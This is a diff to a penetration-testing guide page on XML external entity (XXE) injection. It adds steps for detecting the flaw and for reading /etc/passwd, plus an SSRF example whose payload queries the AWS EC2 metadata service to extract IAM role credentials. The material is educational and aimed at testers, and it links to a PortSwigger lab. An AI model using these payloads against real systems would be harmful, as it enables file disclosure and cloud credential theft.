@@ -12,7 +12,9 @@ XXE injections can sometimes lead to [SSRF (Server-Side Request Forgery)](../../
 
 ## Practice
 
-Testers need to find input vectors and forms that send XML formatted data to the application.
+### Identify an XXE injection vulnerability
+
+Testers need to find inputs or forms that send XML formatted data to the application.
 
 For instance, in the following request, the user submitted a search form with the input "TESTINPUT".
 
@@ -38,7 +40,11 @@ The tester can detect if the XML parser parses the external entities by defining
 </searchForm>
 ```
 
-A vulnerable application should replace the value by "VULNERABLE". The tester can then try to disclose local files by replacing the `from` value with the content of a sensitive file (e.g. `/etc/passwd`).
+A vulnerable application should replace the value by "VULNERABLE".&#x20;
+
+### Retrieve content of local files
+
+When the tester has identified a vulnerable entry point (see [identify an XXE](xxe-injection.md#identify-an-xxe-injection-vulnerability)). He can try to disclose local files by replacing the `from` value with the content of a sensitive file (e.g. `/etc/passwd`).
 
 ```markup
 <?xml version="1.0"?>
@@ -47,6 +53,45 @@ A vulnerable application should replace the value by "VULNERABLE". The tester ca
   <from>&newfrom;</from>
 </searchForm>
 ```
+
+### Conduct an SSRF attack
+
+An XXE can be exploited to conduct an SSRF. When an application performs data transfer using XML, the request can be intercepted and forwarded to an internal host as follow.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY newfrom SYSTEM "http://{internal_host}/..."> ]>
+<searchForm>
+    <from>&newfrom;</from>
+</searchForm>
+```
+
+<details>
+
+<summary>Example: Get EC2 IAM role temporary credentials</summary>
+
+In the following example, the attacker tries to access the AWS EC2 metadata service to retrieve the EC2 role credentials used by the server.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/metadata/iam/security-credentials/"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+```
+
+The internal server will reveal the URL path to access the role's credentials as an error message at each step by displaying the HTTP response body of the accessed URL as follows:&#x20;
+
+1. URL = "http://169.254.169.254/latest/metadata/iam/security-credentials/"\
+   The server will return an error message revealing the EC2 role name: `invalid productId ec2-role-name`_._
+
+<!---->
+
+1. URL = "http://169.254.169.254/latest/metadata/iam/security-credentials/ec2-role-name"\
+   The server will return an error message revealing the EC2 role's secrets as `invalid productId`.
+
+For more details, refer to the ["XXE to SSRF" PortSwigger lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf).
+
+</details>
 
 ## References
 
